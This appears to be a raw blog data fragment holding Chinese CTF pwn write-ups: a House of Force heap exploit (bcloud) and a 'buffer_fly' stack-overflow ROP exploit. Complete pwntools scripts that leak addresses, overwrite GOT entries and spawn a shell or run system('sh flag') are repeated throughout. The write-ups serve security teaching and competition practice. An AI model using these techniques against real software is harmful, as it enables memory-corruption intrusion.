class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;i386&#x27;</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn2&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&quot;./pwn2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">length,content</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;---&gt;&gt;\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Input the length of the note content:\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Input the content:\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">Id,content</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;---&gt;&gt;\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Input the id:\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(Id))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Input the new content:\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">Id</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;---&gt;&gt;\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Input the id:\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(Id))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">\tgdb.attach(p,<span class=\"string\">&#x27;x/8wx 0x804b120&#x27;</span>)</span><br><span class=\"line\">\tpause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak heap base</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Input your name:\\n&quot;</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\">heapbase=u32(p.recvuntil(<span class=\"string\">&#x27;!&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x8</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*]heapbase: &#123;:&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(heapbase)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#overwrite top chunk size</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Org:\\n&#x27;</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Host:\\n&#x27;</span>)<span class=\"comment\">#overwrite</span></span><br><span class=\"line\">payload=p32(<span class=\"number\">0xffffffff</span>)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x3c</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#overwrite chunk_list</span></span><br><span class=\"line\">chunk_list=<span class=\"number\">0x0804B120</span></span><br><span class=\"line\">fake_chunk=<span class=\"number\">0x0804B118</span></span><br><span class=\"line\">top_chunk=heapbase+<span class=\"number\">0xf8</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(-(top_chunk-fake_chunk),<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">&#x27;cccc&#x27;</span>)<span class=\"comment\">#chunk_list[2]-&gt;chunk_list</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak libc</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p32(elf.got[<span class=\"string\">&#x27;free&#x27;</span>])+p32(elf.got[<span class=\"string\">&#x27;atoi&#x27;</span>])+p32(elf.got[<span class=\"string\">&#x27;atoi&#x27;</span>]))</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p32(elf.sym[<span class=\"string\">&#x27;puts&#x27;</span>]))<span class=\"comment\">#overwrite free@got to puts@plt </span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">atoi_addr=u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">libcbase=atoi_addr-libc.sym[<span class=\"string\">&#x27;atoi&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*]libcbase: &#123;:&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libcbase)))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#get shell</span></span><br><span class=\"line\"><span class=\"comment\">#overwrite atoi@got to system</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]))</span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p32(libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<p>House of Force例题</p>","more":"<p>32位堆题，菜单，NO PIE, Partial RELRO。</p>\n<p>House of Force</p>\n<h3 id=\"主要漏洞点\"><a href=\"#主要漏洞点\" class=\"headerlink\" title=\"主要漏洞点\"></a>主要漏洞点</h3><p>在get_input函数中有个off by null的漏洞，如果刚好写入size大小的内容则会触发。</p>\n<p><img src=\"./bcloud/get_input.jpg\" alt=\"get_input\"></p>\n<h3 id=\"leak-heapbase\"><a href=\"#leak-heapbase\" class=\"headerlink\" title=\"leak heapbase\"></a>leak heapbase</h3><p>由get_input导致的问题，在input_name函数可以用来leak heapbase。对s写满0x40，则其\\x00会溢出到v2的位置，在执行v2=malloc(0x40)后，这个\\x00会被覆盖，因此在后面的strcpy(v2,s)的时候会将v2的chunk地址一并copy到chunk中。在后续的welcome中会输出出来。</p>\n<p><img src=\"./bcloud/input_name.jpg\" alt=\"input_name\"></p>\n<h3 id=\"改写top-chunk-size\"><a href=\"#改写top-chunk-size\" class=\"headerlink\" title=\"改写top chunk size\"></a>改写top chunk size</h3><p>在org_host函数中也有一样的问题，并且更加严重。对s写满0x40，则其\\x00会溢出到v2的位置，在执行v2=malloc(0x40)后，这个\\x00会被覆盖。并且由于v2后面紧接着就是v3，而v2是写满4byte的一个地址，因此在后面的strcpy(v2,s)的时候会将<strong>s的内容+v2的chunk地址+v3中的内容</strong>一并copy到chunk中，而chunk大小只有0x44，因此会溢出到next chunk的size字段，而<strong>下一个chunk就是top chunk，由此可以改写top chunk size</strong>。</p>\n<p><img src=\"./bcloud/org_host.jpg\" alt=\"org_host\"></p>\n<h3 id=\"分配到chunk-list，获取任意写\"><a href=\"#分配到chunk-list，获取任意写\" class=\"headerlink\" title=\"分配到chunk_list，获取任意写\"></a>分配到chunk_list，获取任意写</h3><p>在改写了top chunk size之后，我们就可以利用House of Force实现<strong>任意地址分配</strong>了，之后我们考虑怎么利用这个任意地址分配。</p>\n<p>edit函数的功能是对chunk的content进行修改，其中取chunk是从bss段的chunk_list中按照id取出的，因此如果能够<strong>改写chunk_list中的内容</strong>，那么就可以实现<strong>任意写</strong>。</p>\n<p>要分配到chunk_list(0x804b120)，可以分配fake chunk(0x804b118)。我们要计算top chunk和fake chunk之间的偏移。top chunk的地址可以通过heapbase+offset计算得到。top chunk和fake chunk之间的偏移是 <strong>-(top chunk - fake chunk)或0x10804b118-top chunk</strong> 。malloc了这个大小的chunk后，下次malloc就能malloc到fake chunk了。</p>\n<h3 id=\"leak-libc\"><a href=\"#leak-libc\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h3><p>本题中没有edit函数，没办法输出。但是我们有任意写，可以<strong>改写其他函数的GOT表项来调用函数输出</strong>。</p>\n<p>此处可以改写delete功能中free函数的GOT表项为puts，再将chunk_list中对应的位置改为atoi的GOT表项的地址，就可以得到libcbase。</p>\n<h3 id=\"get-shell\"><a href=\"#get-shell\" class=\"headerlink\" title=\"get shell\"></a>get shell</h3><p>get shell也是采用修改GOT表项的方法，将atoi的GOT表项修改为system，输入/bin/sh\\x00即可get shell。需要注意的是free了的id对应的chunk_list[id]和length_list[id]都会清0，虽然chunk_list[id]可以在我们申请到的fake chunk中修改，但length_list我们没有申请到，因此不能直接edit。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;i386&#x27;</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn2&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&quot;./pwn2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">length,content</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;---&gt;&gt;\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Input the length of the note content:\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Input the content:\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">Id,content</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;---&gt;&gt;\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Input the id:\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(Id))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Input the new content:\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">Id</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;---&gt;&gt;\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Input the id:\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(Id))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">\tgdb.attach(p,<span class=\"string\">&#x27;x/8wx 0x804b120&#x27;</span>)</span><br><span class=\"line\">\tpause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak heap base</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Input your name:\\n&quot;</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\">heapbase=u32(p.recvuntil(<span class=\"string\">&#x27;!&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x8</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*]heapbase: &#123;:&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(heapbase)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#overwrite top chunk size</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Org:\\n&#x27;</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Host:\\n&#x27;</span>)<span class=\"comment\">#overwrite</span></span><br><span class=\"line\">payload=p32(<span class=\"number\">0xffffffff</span>)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x3c</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#overwrite chunk_list</span></span><br><span class=\"line\">chunk_list=<span class=\"number\">0x0804B120</span></span><br><span class=\"line\">fake_chunk=<span class=\"number\">0x0804B118</span></span><br><span class=\"line\">top_chunk=heapbase+<span class=\"number\">0xf8</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(-(top_chunk-fake_chunk),<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">&#x27;cccc&#x27;</span>)<span class=\"comment\">#chunk_list[2]-&gt;chunk_list</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak libc</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p32(elf.got[<span class=\"string\">&#x27;free&#x27;</span>])+p32(elf.got[<span class=\"string\">&#x27;atoi&#x27;</span>])+p32(elf.got[<span class=\"string\">&#x27;atoi&#x27;</span>]))</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p32(elf.sym[<span class=\"string\">&#x27;puts&#x27;</span>]))<span class=\"comment\">#overwrite free@got to puts@plt </span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">atoi_addr=u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">libcbase=atoi_addr-libc.sym[<span class=\"string\">&#x27;atoi&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*]libcbase: &#123;:&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libcbase)))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#get shell</span></span><br><span class=\"line\"><span class=\"comment\">#overwrite atoi@got to system</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]))</span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p32(libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"buffer_fly","date":"2023-01-02T11:54:26.000Z","_content":"\nNewStarCTF，利用了下linux中sh的小技巧\n<!-- more -->\n\n64位栈溢出，没开canary，其他都开了。\n\n程序中有system，函数vuln中存在栈溢出漏洞。\n\n```c\nssize_t vuln()\n{\n  char buf[32]; // [rsp+0h] [rbp-20h] BYREF\n\n  printf(\"give me your name: \");\n  read(0, buf, 0x20uLL);\n  printf(\"your name: %s\\n\", buf);\n  printf(\"give me your age: \");\n  read(0, buf, 0x20uLL);\n  printf(\"your age: %s\\n\", buf);\n  printf(\"you are a girl ?\\nsusu give me your wechat number: \");\n  read(0, buf, 0x40uLL);\n  puts(\"waitting.....\");\n  sleep(1u);\n  close(0);\n  close(1);\n  return write(2, \"hhhhh\", 5uLL);\n}\n```\n\nbuf的大小为0x20，有三次的输入机会，前两次都只能输入0x20，最后一次可以输入0x40。\n\n**总体思路就是：先通过前两次输入泄露栈上的内容，最后一次栈溢出调用system函数，执行我们放在栈上的指令。**\n\n因此我们需要泄露两个地址：程序基地址和栈地址。\n\n在调试中可以发现，在buff+0x18的地方有一个nop指令的地址，输入0x18个字节即可泄露出该指令的地址，从而得到程序基地址；而栈地址我们可以通过输入0x20字节泄露出rbp得到。\n\n之后通过pop rdi将“/bin/sh\\x00”在栈上的地址（这里要算一下）送到rdi中，调用system函数即可。\n\n然而没这么容易，在return之前有close(0)，close(1)两条指令，程序的输入流和输出流都被关闭了，我们即使get shell了也无法正常输入和输出，我们只能考虑把flag输出到stderr显示出来。\n\n**而linux中有一个sh指令，sh命令是shell命令语言解释器，执行命令从标准输入读取或从一个文件中读取。如果读取的内容不是sh命令，那么就会报错，文本中的内容就会一起在stderr中输出。**\n\nexp:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64',timeout=1)\nelf=ELF(\"./pwn\")\nlibc=ELF(\"./libc-2.31.so\")\n#p=process(\"./pwn\")\np=remote('node4.buuoj.cn',25713)\n\ndef debug():\n\tgdb.attach(p,\"b main\")\n\tpause()\n\npadding=0x28\n\np.recvuntil('give me your name: ')\np.send('a'*0x18)\np.recvuntil('a'*0x18)\nelf_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\x00'))-0x128b\n\np.recvuntil(\"give me your age: \")\np.send('a'*0x20)\np.recvuntil('a'*0x20)\nstack_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\x00'))\nbuf_addr=stack_addr-0x30\n\nprint(\"[*]elf_addr: \",hex(elf_addr))\nprint(\"[*]stack_addr: \",hex(stack_addr))\nprint(\"[*]buf_addr: \",hex(buf_addr))\nprint(\"read: \",hex(elf.plt['read']))\n\n#debug()\nsys_addr=elf_addr+0x129d# 一开始的时候偏移找错了，找的应该是call system的地址，而不是system函数实际执行的地址。\nret=elf_addr+0x000000000000101a\npop_rdi=elf_addr+0x0000000000001423\n\np.recvuntil(\"you are a girl ?\\nsusu give me your wechat number: \")\n#payload='a'*0x8+p64(pop_rdi)+p64(buf_addr+0x30)+p64(sys_addr)+p64(buf_addr)+p64(leave)+\"cat flag >&2\"\n\npayload=\"sh flag\\x00\".ljust(0x28,'a')+p64(pop_rdi)+p64(buf_addr)+p64(sys_addr)\np.send(payload)\n\np.interactive()\n```","source":"_posts/buffer_fly.md","raw":"---\ntitle: buffer_fly\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- stackoverflow\n- linux_trick\n\n---\n\nNewStarCTF，利用了下linux中sh的小技巧\n<!-- more -->\n\n64位栈溢出，没开canary，其他都开了。\n\n程序中有system，函数vuln中存在栈溢出漏洞。\n\n```c\nssize_t vuln()\n{\n  char buf[32]; // [rsp+0h] [rbp-20h] BYREF\n\n  printf(\"give me your name: \");\n  read(0, buf, 0x20uLL);\n  printf(\"your name: %s\\n\", buf);\n  printf(\"give me your age: \");\n  read(0, buf, 0x20uLL);\n  printf(\"your age: %s\\n\", buf);\n  printf(\"you are a girl ?\\nsusu give me your wechat number: \");\n  read(0, buf, 0x40uLL);\n  puts(\"waitting.....\");\n  sleep(1u);\n  close(0);\n  close(1);\n  return write(2, \"hhhhh\", 5uLL);\n}\n```\n\nbuf的大小为0x20，有三次的输入机会，前两次都只能输入0x20，最后一次可以输入0x40。\n\n**总体思路就是：先通过前两次输入泄露栈上的内容，最后一次栈溢出调用system函数，执行我们放在栈上的指令。**\n\n因此我们需要泄露两个地址：程序基地址和栈地址。\n\n在调试中可以发现，在buff+0x18的地方有一个nop指令的地址，输入0x18个字节即可泄露出该指令的地址，从而得到程序基地址；而栈地址我们可以通过输入0x20字节泄露出rbp得到。\n\n之后通过pop rdi将“/bin/sh\\x00”在栈上的地址（这里要算一下）送到rdi中，调用system函数即可。\n\n然而没这么容易，在return之前有close(0)，close(1)两条指令，程序的输入流和输出流都被关闭了，我们即使get shell了也无法正常输入和输出，我们只能考虑把flag输出到stderr显示出来。\n\n**而linux中有一个sh指令，sh命令是shell命令语言解释器，执行命令从标准输入读取或从一个文件中读取。如果读取的内容不是sh命令，那么就会报错，文本中的内容就会一起在stderr中输出。**\n\nexp:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64',timeout=1)\nelf=ELF(\"./pwn\")\nlibc=ELF(\"./libc-2.31.so\")\n#p=process(\"./pwn\")\np=remote('node4.buuoj.cn',25713)\n\ndef debug():\n\tgdb.attach(p,\"b main\")\n\tpause()\n\npadding=0x28\n\np.recvuntil('give me your name: ')\np.send('a'*0x18)\np.recvuntil('a'*0x18)\nelf_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\x00'))-0x128b\n\np.recvuntil(\"give me your age: \")\np.send('a'*0x20)\np.recvuntil('a'*0x20)\nstack_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\x00'))\nbuf_addr=stack_addr-0x30\n\nprint(\"[*]elf_addr: \",hex(elf_addr))\nprint(\"[*]stack_addr: \",hex(stack_addr))\nprint(\"[*]buf_addr: \",hex(buf_addr))\nprint(\"read: \",hex(elf.plt['read']))\n\n#debug()\nsys_addr=elf_addr+0x129d# 一开始的时候偏移找错了，找的应该是call system的地址，而不是system函数实际执行的地址。\nret=elf_addr+0x000000000000101a\npop_rdi=elf_addr+0x0000000000001423\n\np.recvuntil(\"you are a girl ?\\nsusu give me your wechat number: \")\n#payload='a'*0x8+p64(pop_rdi)+p64(buf_addr+0x30)+p64(sys_addr)+p64(buf_addr)+p64(leave)+\"cat flag >&2\"\n\npayload=\"sh flag\\x00\".ljust(0x28,'a')+p64(pop_rdi)+p64(buf_addr)+p64(sys_addr)\np.send(payload)\n\np.interactive()\n```","slug":"buffer_fly","published":1,"updated":"2023-01-02T16:08:02.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafq002p5oud43145dnr","content":"<p>NewStarCTF，利用了下linux中sh的小技巧</p>\n<span id=\"more\"></span>\n\n<p>64位栈溢出，没开canary，其他都开了。</p>\n<p>程序中有system，函数vuln中存在栈溢出漏洞。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">vuln</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">32</span>]; <span class=\"comment\">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span 